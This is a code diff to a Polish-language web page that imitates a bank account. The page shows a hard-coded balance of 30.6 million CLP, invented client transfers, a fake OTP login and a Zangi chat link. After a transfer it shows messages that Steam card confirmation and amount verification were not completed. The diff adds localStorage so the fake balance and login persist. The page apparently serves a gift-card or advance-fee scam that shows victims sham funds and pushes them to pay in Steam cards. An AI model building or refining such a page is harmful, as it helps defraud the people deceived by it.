@@ -76,24 +76,37 @@ Wyloguj
 
 <script>
 const ZANGI_LINK="https://services.zangi.com/dl/conversation/3402149595";
-let balance=30600000;
-let tx=[];
-let generatedOTP=null;
 
 const $=id=>document.getElementById(id);
 const fmt=n=>n.toLocaleString('pl-PL');
+
+let balance = Number(localStorage.getItem('balance')) || 30600000;
+let tx = JSON.parse(localStorage.getItem('tx') || '[]');
+let loggedIn = localStorage.getItem('loggedIn') === 'true';
+let generatedOTP = null;
+
+function save(){
+  localStorage.setItem('balance', balance);
+  localStorage.setItem('tx', JSON.stringify(tx));
+}
 
 function toast(m){
   $('toast').textContent=m;
   $('toast').style.display='block';
   setTimeout(()=>$('toast').style.display='none',2000);
 }
-function openModal(h){$('modal').innerHTML=h;$('modalBack').style.display='flex'}
-function closeModal(){$('modalBack').style.display='none'}
+
+function openModal(h){
+  $('modal').innerHTML=h;
+  $('modalBack').style.display='flex';
+}
+function closeModal(){
+  $('modalBack').style.display='none';
+}
 
 function render(){
   $('balance').textContent=fmt(balance)+' CLP';
-  const l=$('txList');l.innerHTML='';
+  const l=$('txList'); l.innerHTML='';
   tx.slice().reverse().forEach(t=>{
     l.innerHTML+=`
       <div class="tx">
@@ -105,14 +118,24 @@ function render(){
         <strong>- ${fmt(t.amount)} CLP</strong>
       </div>`;
   });
+  save();
 }
 
-(function preload(){
+if(tx.length===0){
   const a=[10000,20000,5000,100000,500000];
   for(let i=1;i<=15;i++){
     tx.push({type:'Przelew',name:'Klient '+i,account:'KONTO'+(100000+i),amount:a[i%a.length],date:new Date().toDateString()});
   }
-})();
+  save();
+}
+
+function showApp(){
+  $('signup').style.display='none';
+  $('app').style.display='block';
+  render();
+}
+
+if(loggedIn) showApp();
 
 $('signupBtn').onclick=()=>{
   if(!$('name').value||!$('phone').value){toast('Wprowadź dane');return;}
@@ -125,10 +148,9 @@ $('signupBtn').onclick=()=>{
   `);
   $('verify').onclick=()=>{
     if(Number($('otp').value)===generatedOTP){
+      localStorage.setItem('loggedIn','true');
       closeModal();
-      $('signup').style.display='none';
-      $('app').style.display='block';
-      render();
+      showApp();
       toast('Logowanie zakończone sukcesem');
     }else toast('Nieprawidłowy kod OTP');
   };
@@ -148,7 +170,7 @@ $('billsBtn').onclick=()=>{
   $('pay').onclick=()=>{
     const a=Number($('ba').value);
     tx.push({type:'Płatność rachunku',name:$('bn').value,account:'—',amount:a,date:new Date().toDateString()});
-    balance-=a;render();closeModal();
+    balance-=a; render(); closeModal();
   };
 };
 
@@ -177,7 +199,7 @@ $('transferBtn').onclick=()=>{
 
     setTimeout(()=>{
       tx.push({type:'Przelew',name:n,account:a,amount:m,date:new Date().toDateString()});
-      balance-=m;render();
+      balance-=m; render();
       openModal(`
         <div class="card">Karta Steam: potwierdzenie odbiorcy nie zostało ukończone</div>
         <div class="card">Karta Steam: weryfikacja kwoty nie została ukończona</div>
@@ -194,10 +216,8 @@ $('transferBtn').onclick=()=>{
 };
 
 $('logoutBtn').onclick=()=>{
-  $('app').style.display='none';
-  $('signup').style.display='block';
-  $('name').value='';$('phone').value='';
-  toast('Wylogowano');
+  localStorage.clear();
+  location.reload();
 };
 </script>
 </body>
